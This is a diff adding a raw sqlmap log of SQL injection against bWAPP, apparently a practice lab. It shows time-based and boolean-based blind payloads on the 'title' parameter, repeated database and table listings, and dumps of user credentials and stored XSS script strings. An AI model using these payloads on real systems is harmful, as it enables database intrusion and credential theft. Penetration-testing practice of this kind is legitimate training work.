@@ -1,0 +1,1689 @@
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=sad' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))KOsf) AND 'sJBU'='sJBU&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=sad' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))KOsf) AND 'sJBU'='sJBU&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=sad' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))KOsf) AND 'sJBU'='sJBU&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+sqlmap identified the following injection point(s) with a total of 578 HTTP(s) requests:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=sad' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))KOsf) AND 'sJBU'='sJBU&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=sad' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))KOsf) AND 'sJBU'='sJBU&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 5.0.12
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: title=<script>alert()/script>' OR NOT 2016=2016-- FDMd&action=search
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: title=<script>alert()/script>' AND (SELECT 1622 FROM (SELECT(SLEEP(5)))Dwty)-- SObp&action=search
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL >= 5.0.12
+Database: bWAPP
+[5 tables]
++---------------------------------------+
+| blog                                  |
+| heroes                                |
+| movies                                |
+| users                                 |
+| visitors                              |
++---------------------------------------+
+
+Database: drupageddon
+[73 tables]
++---------------------------------------+
+| block                                 |
+| cache                                 |
+| comment                               |
+| filter                                |
+| history                               |
+| role                                  |
+| system                                |
+| actions                               |
+| authmap                               |
+| batch                                 |
+| block_custom                          |
+| block_node_type                       |
+| block_role                            |
+| blocked_ips                           |
+| cache_block                           |
+| cache_bootstrap                       |
+| cache_field                           |
+| cache_filter                          |
+| cache_form                            |
+| cache_image                           |
+| cache_menu                            |
+| cache_page                            |
+| cache_path                            |
+| date_format_locale                    |
+| date_format_type                      |
+| date_formats                          |
+| field_config                          |
+| field_config_instance                 |
+| field_data_body                       |
+| field_data_comment_body               |
+| field_data_field_image                |
+| field_data_field_tags                 |
+| field_revision_body                   |
+| field_revision_comment_body           |
+| field_revision_field_image            |
+| field_revision_field_tags             |
+| file_managed                          |
+| file_usage                            |
+| filter_format                         |
+| flood                                 |
+| image_effects                         |
+| image_styles                          |
+| menu_custom                           |
+| menu_links                            |
+| menu_router                           |
+| node                                  |
+| node_access                           |
+| node_comment_statistics               |
+| node_revision                         |
+| node_type                             |
+| queue                                 |
+| rdf_mapping                           |
+| registry                              |
+| registry_file                         |
+| role_permission                       |
+| search_dataset                        |
+| search_index                          |
+| search_node_links                     |
+| search_total                          |
+| semaphore                             |
+| sequences                             |
+| sessions                              |
+| shortcut_set                          |
+| shortcut_set_users                    |
+| taxonomy_index                        |
+| taxonomy_term_data                    |
+| taxonomy_term_hierarchy               |
+| taxonomy_vocabulary                   |
+| url_alias                             |
+| users                                 |
+| users_roles                           |
+| variable                              |
+| watchdog                              |
++---------------------------------------+
+
+Database: mysql
+[17 tables]
++---------------------------------------+
+| host                                  |
+| user                                  |
+| columns_priv                          |
+| db                                    |
+| func                                  |
+| help_category                         |
+| help_keyword                          |
+| help_relation                         |
+| help_topic                            |
+| proc                                  |
+| procs_priv                            |
+| tables_priv                           |
+| time_zone                             |
+| time_zone_leap_second                 |
+| time_zone_name                        |
+| time_zone_transition                  |
+| time_zone_transition_type             |
++---------------------------------------+
+
+Database: information_schema
+[17 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMN_PRIVILEGES                     |
+| KEY_COLUMN_USAGE                      |
+| PROFILING                             |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| COLUMNS                               |
+| TABLES                                |
+| TRIGGERS                              |
++---------------------------------------+
+
+Database: bWAPP
+Table: movies
+[10 entries]
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| id | imdb      | genre  | title                    | release_year | tickets_stock | main_character  |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| 1  | tt1583421 | action | G.I. Joe: Retaliation    | 2013         | 100           | Cobra Commander |
+| 2  | tt0371746 | action | Iron Man                 | 2008         | 53            | Tony Stark      |
+| 3  | tt0770828 | action | Man of Steel             | 2013         | 78            | Clark Kent      |
+| 4  | tt0438488 | sci-fi | Terminator Salvation     | 2009         | 100           | John Connor     |
+| 5  | tt0948470 | action | The Amazing Spider-Man   | 2012         | 13            | Peter Parker    |
+| 6  | tt1259521 | horror | The Cabin in the Woods   | 2011         | 666           | Some zombies    |
+| 7  | tt1345836 | action | The Dark Knight Rises    | 2012         | 3             | Bruce Wayne     |
+| 8  | tt0232500 | action | The Fast and the Furious | 2001         | 40            | Brian O'Connor  |
+| 9  | tt0800080 | action | The Incredible Hulk      | 2008         | 23            | Bruce Banner    |
+| 10 | tt0816711 | horror | World War Z              | 2013         | 0             | Gerry Lane      |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+Database: bWAPP
+Table: visitors
+[9 entries]
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+| id | date                | ip_address     | user_agent                                                                                                          |
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+| 1  | 2023-06-19 21:20:55 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 2  | 2023-06-19 21:23:40 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 3  | 2023-06-19 21:24:21 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 4  | 2023-06-19 21:28:12 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 5  | 2023-06-19 21:28:31 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 6  | 2023-06-19 21:34:12 | 192.168.56.101 | <script>var currentDomain = window.location.hostname;                                                               |
+| 7  | 2023-06-19 21:37:39 | 192.168.56.101 | <script>var currentDomain = window.location.hostname; alert("\x1f>B>G=89 4><5=: " + currentDomain);</script>        |
+| 8  | 2023-06-19 21:39:43 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
+| 9  | 2023-06-19 21:41:14 | 192.168.56.101 | Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36 |
++----+---------------------+----------------+---------------------------------------------------------------------------------------------------------------------+
+
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| id | email                    | login  | secret                              | admin   | activated | password                                       | reset_code | activation_code |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+| 1  | bwapp-aim@mailinator.com | A.I.M. | A.I.M. or Authentication Is Missing | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
+| 2  | bwapp-bee@mailinator.com | bee    | Any bugs?                           | 1       | 1         | 6885858486f31043e5839c735d99457f045affd0 (bug) | NULL       | NULL            |
++----+--------------------------+--------+-------------------------------------+---------+-----------+------------------------------------------------+------------+-----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: title (GET)
+    Type: boolean-based blind
